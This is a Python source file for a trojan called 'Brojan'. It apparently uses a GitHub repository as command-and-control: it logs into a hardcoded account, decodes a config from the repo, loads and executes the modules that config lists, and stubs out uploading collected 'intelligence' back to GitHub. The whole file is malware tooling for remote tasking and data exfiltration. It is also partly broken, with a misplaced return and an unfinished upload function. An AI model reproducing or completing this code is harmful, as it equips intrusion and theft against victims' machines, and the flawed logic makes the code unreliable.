import json
import base64
import sys
import time
import random
import importlib
import threading
import queue
import os
from github import Github


class GitHubSession():
    username = "mantvydasb"

    def __init__(self, username=username):
        password = input("Github password: ")
        session = Github(username, password)
        self.repository = session.get_repo(self.username + "/network-playground")
        self.branch = self.repository.get_branch("master")

    def getFileContents(self, pathToFile):
        content = self.repository.get_contents(pathToFile)
        return content


class Brojan():
    id = "1"
    configPath = "brojan/configs/" + id + ".json"
    intelligenceStoragePath = "data/%s/" % id
    modules = []
    configured = False
    tasksQueue = queue.Queue()
    github = ''

    def __init__(self):
        self.github = GitHubSession()
        config = self.getConfig()
        modules = self.loadModules(config)
        self.executeModules(modules)

    def uploadIntelligence(self, intelligenceData):
        p = self.github.repository.create_git_blob("pienas", encoding="utf8")

    def executeModules(self, modules):
        for module in modules:
            print(module.execute())

    def getConfig(self):
        config = self.getFileContents(self.configPath)
        config = base64.b64decode(config.content).decode("utf8")
        configJson = json.loads(config)
        return configJson

    def getFileContents(self, filePath):
        return self.github.getFileContents(filePath)

    def loadModules(self, config):
        modules = []
        for module in config['modules']:
            print("Loading module '%s' " % module)
            newModule = importlib.import_module('modules.%s' % module)
            modules.append(newModule)
            return modules
        self.configured =  True

Brojan()


